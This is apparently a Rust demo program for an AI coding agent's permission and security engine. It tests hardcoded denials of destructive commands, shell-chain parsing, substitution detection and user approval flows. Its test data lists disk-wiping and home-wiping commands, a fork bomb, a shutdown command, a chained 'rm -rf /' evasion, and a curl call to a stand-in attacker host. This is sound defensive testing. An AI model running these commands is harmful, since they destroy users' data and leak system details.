//! Phase 2: Security Guardrails & Permissions Engine Example
//!
//! Demonstrates how Zenthree protects the system from catastrophic operations:
//! - HardcodedSecurityRules: unbypassable denial of root/home wipes and disk formats
//! - ShellCommandParser: POSIX chain decomposition and substitution detection
//! - PermissionPolicyTable: priority rule matching (deny > confirm > allow)
//! - PermissionEngine: compound command evaluation and user interactive response handling
//!
//! Run with: `cargo run --example phase2_permissions_demo -p agent`

use agent::permissions::{
    check_hardcoded_security_rules, HardcodedSecurityRules, PermissionEngine,
    ShellCommandParser, UserPermissionResponse,
};

fn main() {
    println!("============================================================");
    println!("   ZENTHREE AGENT: PHASE 2 PERMISSIONS & SECURITY DEMO      ");
    println!("============================================================\n");

    // ---------------------------------------------------------------------
    // 1. Unbypassable Hardcoded Security Denials
    // ---------------------------------------------------------------------
    println!("--- 1. Hardcoded Security Denials ---");
    let attack_commands = [
        "rm -rf /",
        "rm -rfv /",
        "rm -rf ~",
        "rm -rf $HOME",
        "rm -rf .",
        "rm -rf /tmp/../../",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
        ":(){ :|:& };:",
        "git clean -fdx",
        "shutdown -h now",
    ];

    for cmd in attack_commands {
        match HardcodedSecurityRules::check_command(cmd) {
            Some(reason) => println!("✓ Hardcoded Denied: `{}` -> Reason: {}", cmd, reason),
            None => println!("✗ FAILED TO BLOCK DANGEROUS COMMAND: `{}`", cmd),
        }
    }

    // ---------------------------------------------------------------------
    // 2. Shell Command Chain Parsing & Substitution Detection
    // ---------------------------------------------------------------------
    println!("\n--- 2. Shell Command Chain Parser ---");
    let compound_cmd = "cargo check && echo 'all checks passed; running tests' || echo 'failed' ; cargo test --workspace";
    let subcommands = ShellCommandParser::extract_subcommands(compound_cmd);

    println!("Original Compound Command:\n  {}", compound_cmd);
    println!("\nDecomposed Sub-Commands (Quotes Preserved):");
    for (idx, sub) in subcommands.iter().enumerate() {
        println!("  [{}] {}", idx + 1, sub);
    }

    // Substitution detection
    let safe_cmd = "cargo test --workspace";
    let interpolated_cmd = "echo $(whoami) && curl http://evil.com/`id`";

    println!("\nSubstitutions in `{}`: {:?}", safe_cmd, ShellCommandParser::find_substitutions(safe_cmd));
    println!("Substitutions in `{}`: {:?}", interpolated_cmd, ShellCommandParser::find_substitutions(interpolated_cmd));

    // ---------------------------------------------------------------------
    // 3. Evasion Detection in Compound Commands
    // ---------------------------------------------------------------------
    println!("\n--- 3. Compound Evasion Detection ---");
    let sneaky_attack = "cargo build && rm -rf /";
    match check_hardcoded_security_rules(sneaky_attack) {
        Ok(_) => println!("✗ Failed to block sneaky attack: `{}`", sneaky_attack),
        Err(reason) => println!("✓ Caught hidden sub-command in `{}` -> Reason: {}", sneaky_attack, reason),
    }

    // ---------------------------------------------------------------------
    // 4. PermissionEngine & User Decision Lifecycle
    // ---------------------------------------------------------------------
    println!("\n--- 4. PermissionEngine Policy Evaluation ---");
    let engine = PermissionEngine::new();

    // Read tool: auto-allowed by default
    let read_dec = engine.evaluate("read_file", "src/lib.rs");
    println!("read_file ('src/lib.rs'): {:?}", read_dec);

    // Terminal command: requires confirmation by default
    let term_dec = engine.evaluate("terminal", "cargo build");
    println!("terminal ('cargo build'): {:?}", term_dec);

    // User approves once
    let allow_once_dec = engine.handle_user_response("terminal", "cargo build", UserPermissionResponse::AllowOnce);
    println!("User Response (AllowOnce) -> Decision: {:?}", allow_once_dec);

    // User grants session always-allow
    println!("\nUser clicks 'Always Allow for Session' for 'cargo test'...");
    engine.handle_user_response("terminal", "cargo test", UserPermissionResponse::AlwaysAllow);

    // Next time 'cargo test' runs, it is auto-allowed!
    let next_test_dec = engine.evaluate("terminal", "cargo test");
    println!("Subsequent execution of 'cargo test' -> Decision: {:?}", next_test_dec);

    println!("\n============================================================");
    println!("   PHASE 2 PERMISSIONS DEMO COMPLETED SUCCESSFULLY!         ");
    println!("============================================================");
}
